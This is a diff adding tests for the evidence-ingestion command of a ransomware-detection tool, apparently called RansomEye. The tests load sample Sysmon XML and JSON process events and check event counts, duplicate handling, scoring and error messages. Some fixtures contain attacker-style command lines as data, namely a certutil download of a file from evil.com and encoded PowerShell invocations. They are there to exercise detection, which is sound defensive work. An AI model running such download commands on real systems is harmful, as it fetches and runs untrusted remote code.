@@ -306,6 +306,7 @@ def test_cli_help():
     assert result.returncode == 0
     assert "timeline" in result.stdout
     assert "database" in result.stdout
+    assert "ingest" in result.stdout
 
 
 def test_cli_invalid_command():
@@ -313,3 +314,337 @@ def test_cli_invalid_command():
 
     assert result.returncode == 2
     assert "usage:" in result.stderr.lower()
+
+
+# --- Milestone 21.3 CLI Ingestion Tests ---
+
+import json
+from ransomeye.commands import ingest_evidence, parse_evidence_file
+
+
+SAMPLE_SYSMON_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2026-08-08T15:00:00.000Z"/>
+  </System>
+  <EventData>
+    <Data Name="ProcessGuid">{GUID-TEST-1}</Data>
+    <Data Name="ProcessId">4532</Data>
+    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -EncodedCommand SGVsbG8=</Data>
+    <Data Name="User">LAB\\Student</Data>
+  </EventData>
+</Event>"""
+
+SAMPLE_SYSMON_MULTI_XML = """<Events>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2026-08-08T15:00:00.000Z"/>
+  </System>
+  <EventData>
+    <Data Name="ProcessGuid">{GUID-MULTI-1}</Data>
+    <Data Name="ProcessId">1001</Data>
+    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -enc AAAA</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2026-08-08T15:00:05.000Z"/>
+  </System>
+  <EventData>
+    <Data Name="ProcessGuid">{GUID-MULTI-2}</Data>
+    <Data Name="ProcessId">1002</Data>
+    <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
+    <Data Name="CommandLine">certutil.exe -urlcache -split -f http://evil.com/x.bin out.bin</Data>
+  </EventData>
+</Event>
+</Events>"""
+
+
+def test_ingest_json_single_event_via_cli(tmp_path):
+    db_path = tmp_path / "cli_ingest.db"
+    json_path = tmp_path / "single_event.json"
+    event_data = {
+        "event_id": "evt-json-1",
+        "timestamp": "2026-08-08T15:00:00Z",
+        "source": "sysmon",
+        "event_type": "process_creation",
+        "process_name": "powershell.exe",
+        "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
+        "pid": "4532",
+    }
+    json_path.write_text(json.dumps(event_data), encoding="utf-8")
+
+    result = _run_command(
+        [
+            "ingest",
+            "--database",
+            str(db_path),
+            "--case",
+            "CASE-JSON-1",
+            "--file",
+            str(json_path),
+            "--case-name",
+            "JSON Single Case",
+            "--host",
+            "HOST-A",
+        ],
+        cwd=tmp_path,
+    )
+
+    assert result.returncode == 0
+    assert "RansomEye evidence ingestion complete" in result.stdout
+    assert "Events read: 1" in result.stdout
+    assert "Events accepted: 1" in result.stdout
+    assert "Duplicates: 0" in result.stdout
+    assert "Score: 25" in result.stdout
+
+    store = EvidenceStore(db_path)
+    case = store.get_case("CASE-JSON-1")
+    events = store.get_case_events("CASE-JSON-1")
+    store.close()
+
+    assert case["case_name"] == "JSON Single Case"
+    assert len(events) == 1
+    assert events[0]["event_id"] == "evt-json-1"
+
+
+def test_ingest_json_list_and_events_wrapper(tmp_path):
+    db_path = tmp_path / "list_ingest.db"
+    json_path = tmp_path / "events_wrapper.json"
+    data = {
+        "events": [
+            {
+                "event_id": "evt-w-1",
+                "timestamp": "2026-08-08T15:00:00Z",
+                "source": "sysmon",
+                "event_type": "process_creation",
+                "process_name": "powershell.exe",
+                "command_line": "powershell.exe -enc AAAA",
+                "pid": "1000",
+                "process_guid": "{G-1}",
+            },
+            {
+                "event_id": "evt-w-2",
+                "timestamp": "2026-08-08T15:00:05Z",
+                "source": "sysmon",
+                "event_type": "process_creation",
+                "process_name": "certutil.exe",
+                "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe out.exe",
+                "pid": "1000",
+                "process_guid": "{G-1}",
+            },
+        ]
+    }
+    json_path.write_text(json.dumps(data), encoding="utf-8")
+
+    result = _run_command(
+        [
+            "ingest",
+            "--database",
+            str(db_path),
+            "--case",
+            "CASE-WRAPPER",
+            "--file",
+            str(json_path),
+        ],
+        cwd=tmp_path,
+    )
+
+    assert result.returncode == 0
+    assert "Events read: 2" in result.stdout
+    assert "Events accepted: 2" in result.stdout
+    assert "Correlations: 1" in result.stdout
+
+    store = EvidenceStore(db_path)
+    events = store.get_case_events("CASE-WRAPPER")
+    findings = store.get_case_findings("CASE-WRAPPER")
+    store.close()
+
+    assert len(events) == 2
+    assert len(findings) == 2
+
+
+def test_ingest_sysmon_xml_fixture_via_cli(tmp_path):
+    db_path = tmp_path / "xml_ingest.db"
+    xml_path = tmp_path / "sample.xml"
+    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")
+
+    result = _run_command(
+        [
+            "ingest",
+            "--database",
+            str(db_path),
+            "--case",
+            "CASE-XML-1",
+            "--file",
+            str(xml_path),
+            "--format",
+            "sysmon-xml",
+        ],
+        cwd=tmp_path,
+    )
+
+    assert result.returncode == 0
+    assert "Format: sysmon-xml" in result.stdout
+    assert "Events read: 1" in result.stdout
+    assert "Events accepted: 1" in result.stdout
+
+    store = EvidenceStore(db_path)
+    events = store.get_case_events("CASE-XML-1")
+    store.close()
+
+    assert len(events) == 1
+    assert events[0]["process_guid"] == "{GUID-TEST-1}"
+
+
+def test_ingest_sysmon_xml_multiple_events(tmp_path):
+    db_path = tmp_path / "multi_xml.db"
+    xml_path = tmp_path / "multi.xml"
+    xml_path.write_text(SAMPLE_SYSMON_MULTI_XML, encoding="utf-8")
+
+    result = _run_command(
+        [
+            "ingest",
+            "--database",
+            str(db_path),
+            "--case",
+            "CASE-XML-MULTI",
+            "--file",
+            str(xml_path),
+        ],
+        cwd=tmp_path,
+    )
+
+    assert result.returncode == 0
+    assert "Events read: 2" in result.stdout
+    assert "Events accepted: 2" in result.stdout
+
+
+def test_ingest_duplicate_events_counted(tmp_path):
+    db_path = tmp_path / "dup.db"
+    xml_path = tmp_path / "dup.xml"
+    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")
+
+    # Ingest first time
+    _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])
+
+    # Ingest second time -> 1 duplicate
+    result2 = _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])
+
+    assert result2.returncode == 0
+    assert "Events read: 1" in result2.stdout
+    assert "Events accepted: 0" in result2.stdout
+    assert "Duplicates: 1" in result2.stdout
+
+
+def test_ingest_missing_file_fails(tmp_path):
+    db_path = tmp_path / "test.db"
+    result = _run_command(
+        [
+            "ingest",
+            "--database",
+            str(db_path),
+            "--case",
+            "CASE-ERR",
+            "--file",
+            str(tmp_path / "nonexistent.json"),
+        ]
+    )
+    assert result.returncode != 0
+    assert "Evidence file not found" in result.stderr
+
+
+def test_ingest_invalid_json_fails(tmp_path):
+    db_path = tmp_path / "test.db"
+    bad_json = tmp_path / "bad.json"
+    bad_json.write_text("{broken json", encoding="utf-8")
+
+    result = _run_command(
+        [
+            "ingest",
+            "--database",
+            str(db_path),
+            "--case",
+            "CASE-ERR",
+            "--file",
+            str(bad_json),
+        ]
+    )
+    assert result.returncode != 0
+    assert "Invalid JSON" in result.stderr
+
+
+def test_ingest_invalid_xml_fails(tmp_path):
+    db_path = tmp_path / "test.db"
+    bad_xml = tmp_path / "bad.xml"
+    bad_xml.write_text("<not valid xml at all", encoding="utf-8")
+
+    result = _run_command(
+        [
+            "ingest",
+            "--database",
+            str(db_path),
+            "--case",
+            "CASE-ERR",
+            "--file",
+            str(bad_xml),
+        ]
+    )
+    assert result.returncode != 0
+    assert "No valid Sysmon XML events found" in result.stderr
+
+
+def test_ingest_empty_file_fails(tmp_path):
+    db_path = tmp_path / "test.db"
+    empty_file = tmp_path / "empty.json"
+    empty_file.write_text("   \n", encoding="utf-8")
+
+    result = _run_command(
+        [
+            "ingest",
+            "--database",
+            str(db_path),
+            "--case",
+            "CASE-ERR",
+            "--file",
+            str(empty_file),
+        ]
+    )
+    assert result.returncode != 0
+    assert "Evidence file is empty" in result.stderr
+
+
+def test_ingest_existing_case_preserves_metadata(tmp_path):
+    db_path = tmp_path / "existing.db"
+    store = EvidenceStore(db_path)
+    store.create_case("CASE-EXIST", "Original Name", host="ORIGINAL-HOST")
+    store.close()
+
+    json_path = tmp_path / "event.json"
+    json_path.write_text(json.dumps({"event_id": "e-1", "timestamp": "2026-08-08T15:00:00Z", "source": "sysmon", "event_type": "process_creation"}), encoding="utf-8")
+
+    result = _run_command(
+        [
+            "ingest",
+            "--database",
+            str(db_path),
+            "--case",
+            "CASE-EXIST",
+            "--file",
+            str(json_path),
+            "--case-name",
+            "New Ignored Name",
+        ]
+    )
+    assert result.returncode == 0
+
+    store = EvidenceStore(db_path)
+    case = store.get_case("CASE-EXIST")
+    store.close()
+
+    assert case["case_name"] == "Original Name"
+    assert case["host"] == "ORIGINAL-HOST"
